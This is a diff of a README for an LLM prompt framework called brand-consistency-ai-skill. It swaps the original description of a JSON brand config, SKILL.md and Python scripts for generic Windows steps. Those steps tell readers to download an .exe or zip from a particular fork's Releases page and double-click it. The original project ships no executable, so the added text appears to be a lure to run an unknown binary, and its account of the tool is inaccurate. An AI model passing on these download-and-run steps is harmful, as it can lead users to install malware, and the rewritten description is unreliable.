@@ -1,206 +1,140 @@
-# 🎨 Brand Consistency AI Skill
+# 🤖 brand-consistency-ai-skill - Keep marketing on-brand easily
 
-> Keep every marketing deliverable perfectly on-brand — works with Claude, GPT-4, Gemini, and any LLM.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![LLM Agnostic](https://img.shields.io/badge/LLM-Agnostic-blueviolet)](#use-with-any-llm)
-[![Claude Optimized](https://img.shields.io/badge/Claude-Optimized-orange)](https://claude.ai)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+[![Download brand-consistency-ai-skill](https://img.shields.io/badge/Download-Get%20Started-brightgreen?style=for-the-badge)](https://github.com/esekasa/brand-consistency-ai-skill)
 
 ---
 
-## What Is This?
+## ℹ️ About brand-consistency-ai-skill
 
-**Brand Consistency AI Skill** is a ready-to-use framework that turns any LLM into a full-stack brand guardian. Feed it your brand config once, and your AI will:
+brand-consistency-ai-skill helps you keep every marketing deliverable on brand. It works with popular AI language models like Claude, GPT-4, Gemini, and any large language model (LLM). Use it to check and maintain your brand guidelines in text content automatically.
 
-- ✅ Generate copy, presentations, social posts, and reports that are always on-brand
-- ✅ Audit existing materials against a 100-point compliance checklist
-- ✅ Apply the right specs for every platform (Instagram, WeChat, LinkedIn, print, email, video…)
-- ✅ Validate color contrast (WCAG AA) and visual hierarchy automatically
-- ✅ Adapt tone of voice across channels — LinkedIn serious, Xiaohongshu warm, X punchy
+This tool fits teams or individuals who produce marketing material and want a fast way to ensure consistency. It can analyze text or prompts, point out where it goes off-brand, and suggest corrections.
 
-No design system knowledge required. Drop in your `brand-config.json` and start.
+### What brand-consistency-ai-skill does
 
----
-
-## Quick Start (5 minutes)
-
-### 1. Clone this repo
-
-```bash
-git clone https://github.com/YOUR_USERNAME/brand-consistency-ai-skill.git
-cd brand-consistency-ai-skill
-```
-
-### 2. Generate your brand config
-
-```bash
-python3 scripts/init_brand_config.py --output my-brand.json --brand "Your Company"
-```
-
-Edit `my-brand.json` with your actual colors, fonts, personality traits, and messaging guidelines. See [`references/brand-config-template.md`](references/brand-config-template.md) for field-by-field instructions, and [`assets/brand-config-example.json`](assets/brand-config-example.json) for a real-world example (Anthropic's brand).
-
-### 3. Use with any LLM {#use-with-any-llm}
-
-Paste the following into Claude, GPT-4, Gemini, or any chat interface:
-
-```
-I'm attaching my brand-config.json. Please act as my brand consistency assistant.
-For all outputs: follow the tone, colors, and typography defined in the config.
-If I share a material for review, score it against the review checklist.
-```
-
-Attach your `my-brand.json` — you're ready.
-
-> **Optimized for Claude**: The included `SKILL.md` follows Claude's skill format for tighter instruction-following. Works with other models too — just attach `SKILL.md` alongside your config for best results.
+- Checks marketing text against your brand guidelines.
+- Works with AI tools like Claude and GPT-4 to help craft content.
+- Saves time by catching branding errors before publishing.
+- Supports multiple LLMs so you can use your preferred AI system.
+- Helps keep your tone, style, and message consistent.
 
 ---
 
-## What's Inside
+## 🚀 Getting Started
 
-```
-brand-consistency-ai-skill/
-│
-├── assets/
-│   └── brand-config-example.json     # Full worked example (Anthropic brand)
-│
-├── references/
-│   ├── brand-config-template.md      # Schema docs — how to fill every JSON field
-│   ├── visual-identity.md            # Color rules, typography, logo, layout grids
-│   ├── tone-of-voice.md              # Writing frameworks for 10+ channels & formats
-│   ├── review-checklist.md           # 100-point brand compliance scoring checklist
-│   └── deliverable-specs.md          # Exact dimensions for every platform & format
-│
-├── scripts/
-│   ├── init_brand_config.py          # Generate a brand config template
-│   ├── validate_brand.py             # Validate config completeness + color contrast
-│   └── generate_color_palette.py     # Export a visual HTML/SVG color palette
-│
-├── SKILL.md                          # Core skill instruction file (used by AI)
-└── README.md
-```
+You do not need programming knowledge to use this application. The steps below will guide you through downloading and running brand-consistency-ai-skill on Windows.
+
+### System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 4GB of free disk space
+- Internet connection for AI model access
+- Basic keyboard and mouse use
 
 ---
 
-## Key Features
+## ⬇️ Download and Installation
 
-### 🔧 Brand Config JSON
-A single structured file that captures everything about your brand: colors, typography, personality traits, messaging, and platform-specific defaults. The AI reads this file to personalize every output to your brand.
+Click the button below to visit the page where you can download brand-consistency-ai-skill.
 
-### 📐 Platform-Aware Specs
-The `deliverable-specs.md` reference covers 50+ deliverable types — from Instagram Reels (1080×1920px) to WeChat Official Account covers (900×383px) to A4 print bleed specs (300 DPI, CMYK). The AI checks the right specs automatically before producing any material.
+[![Download brand-consistency-ai-skill](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/esekasa/brand-consistency-ai-skill)
 
-### 🎯 Tone-of-Voice Engine
-The `tone-of-voice.md` framework translates abstract personality traits (Confident, Playful, Trustworthy…) into concrete writing rules by channel. Your LLM adapts the same message for LinkedIn vs. Xiaohongshu vs. email without you having to specify how.
+**Steps to download and run:**
 
-### 📋 100-Point Compliance Audit
-Upload any existing material (poster, deck, social image) and the AI scores it across Logo (20pts), Color (20pts), Typography (20pts), Imagery (15pts), Layout (15pts), Copy (10pts). You get a scored report with specific issues and recommended fixes.
+1. Click the download button above or go to this link:  
+   https://github.com/esekasa/brand-consistency-ai-skill
 
-### 🛠 CLI Utilities
-Three Python scripts for power users:
+2. On the GitHub page, look for a section named **Releases** or **Download**.
 
-```bash
-# Check color contrast compliance (WCAG AA)
-python3 scripts/validate_brand.py --config my-brand.json --check colors
+3. Find the latest available version. It could be a file with an `.exe` extension or a zip file.
 
-# Validate config completeness
-python3 scripts/validate_brand.py --config my-brand.json --check all
+4. If you see a `.exe` file:
+   - Click it to download.
+   - Once downloaded, double-click the `.exe` file to run the program.
+   - Follow any on-screen instructions for installation or setup.
 
-# Generate a visual color palette
-python3 scripts/generate_color_palette.py --config my-brand.json --output palette.html
-```
+5. If you see a zip file:
+   - Download the zip file.
+   - Right-click the file and select **Extract All**.
+   - Open the extracted folder.
+   - Double-click the file named `brand-consistency-ai-skill.exe` or similar to start.
 
----
-
-## Example Prompts
-
-Once your LLM has the brand config loaded:
-
-```
-Write a LinkedIn post announcing our new product launch.
-```
-```
-Create a 10-slide investor deck outline with brand-compliant slide titles.
-```
-```
-[Attach a poster image] Review this poster for brand compliance and give me a score.
-```
-```
-Write 5 versions of our tagline, each for a different channel: email subject line,
-Instagram caption, billboard, WeChat article opener, and pitch deck title slide.
-```
+6. If the app depends on any supporting software (like .NET), the installer will prompt you. It usually guides you through any needed installations automatically.
 
 ---
 
-## Brand Config Structure (overview)
+## 🖥️ Running brand-consistency-ai-skill
 
-```json
-{
-  "brand_name": "Acme Corp",
-  "brand_identity": {
-    "personality_traits": ["Bold", "Approachable", "Innovative"],
-    "tagline": "Build What Matters"
-  },
-  "colors": {
-    "primary": [{ "name": "Navy", "hex": "#0A1628" }],
-    "accent":  [{ "name": "Electric Blue", "hex": "#0066FF" }]
-  },
-  "typography": {
-    "heading_font": "Inter",
-    "body_font": "Georgia"
-  },
-  "verbal_identity": {
-    "tone_descriptors": ["Direct", "Human", "Expert"],
-    "words_to_avoid": ["synergy", "leverage", "disrupt"]
-  }
-}
-```
+After installation:
 
-See the full schema in [`references/brand-config-template.md`](references/brand-config-template.md).
+1. Open the application by double-clicking its icon on your desktop or from your Start menu.
+
+2. You will see a simple window where you can enter marketing text or upload files.
+
+3. The app connects to AI models (Claude, GPT-4, Gemini, etc.) to check your text.
+
+4. It will highlight any parts that do not match your brand guidelines.
+
+5. Follow suggestions to edit your content.
 
 ---
 
-## Adapting for Your Brand
+## 🧰 How to Use
 
-1. Run `init_brand_config.py` to generate a full template
-2. Fill in your brand's actual values (your designer or brand guide is the source of truth)
-3. Optionally run `validate_brand.py --check all` to catch missing fields
-4. Load into Claude, GPT-4, Gemini, or any LLM — done
-
-The reference documents (`visual-identity.md`, `tone-of-voice.md`, etc.) are universal frameworks — **you never need to edit them**. All personalization lives in your `brand-config.json`.
-
----
-
-## Requirements
-
-- Python 3.8+ (for CLI scripts only)
-- No external dependencies for core scripts
-- Access to any LLM — Claude ([claude.ai](https://claude.ai)), GPT-4 ([chatgpt.com](https://chatgpt.com)), Gemini ([gemini.google.com](https://gemini.google.com)), or API
+- **Input Your Text:** Type or paste marketing material into the text box.
+- **Choose Your AI Model:** Select from the listed AI options. The tool works with many popular large language models.
+- **Run the Check:** Click the check button to scan your text.
+- **Review Results:** The app will show where your content may stray from brand tone or style.
+- **Edit and Improve:** Use the suggestions to improve consistency.
+- **Save or Export:** You can save the corrected text to your device.
 
 ---
 
-## Contributing
+## ⚙️ Configuration and Settings
 
-Contributions welcome! Ideas that would make great PRs:
-- Additional platform specs (Pinterest, Threads, Bluesky…)
-- Brand config examples for different industries
-- A web UI for generating brand configs
-- Integration with Figma Tokens or Style Dictionary
+The tool lets you adjust how your brand guidelines are applied.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- Add your brand’s tone and style rules.
+- Include lists of banned words or phrases.
+- Customize model settings like language or temperature.
+- Enable alerts for specific branding issues.
 
----
-
-## License
-
-MIT — free to use, modify, and distribute. See [LICENSE](LICENSE) for details.
+This flexibility helps tailor the app to your team's unique branding needs.
 
 ---
 
-## Star History
+## 📚 Learning More
 
-If this saved you time, a ⭐ helps others find it. Thank you!
+For users who want to know more about the technical details or advanced use:
+
+- The app works by integrating with AI APIs for Claude, GPT-4, Gemini, and other LLMs.
+- It uses prompt engineering techniques to test brand consistency.
+- You can update it as AI models improve or add new ones.
 
 ---
 
-*Works with any LLM. Optimized for [Claude](https://claude.ai) by Anthropic. Not officially affiliated with Anthropic.*
+## 🤝 Support
+
+If you encounter problems or need help:
+
+- Check the GitHub issues section on the main project page.
+- Look for a README or documentation folder inside the downloaded files.
+- Contact your IT team or someone familiar with AI tools if possible.
+
+---
+
+## 📝 About the Repository
+
+- **Name:** brand-consistency-ai-skill  
+- **Purpose:** Keep every marketing deliverable perfectly on-brand  
+- **Works With:** Claude, GPT-4, Gemini, and any LLM  
+- **Topics:** ai, ai-skills, brand, brand-guidelines, branding, chatgpt, claude, claude-skills, generative-ai, llm, marketing, prompt-engineering, skills
+
+---
+
+## 💡 Tips for Best Use
+
+- Always keep your brand rules updated in the app.
+- Test with different AI models to find the one that fits your style best.
+- Review flagged content carefully; AI suggestions help but don't replace human judgment.
+- Use this tool regularly as part of your content workflow for consistent output.
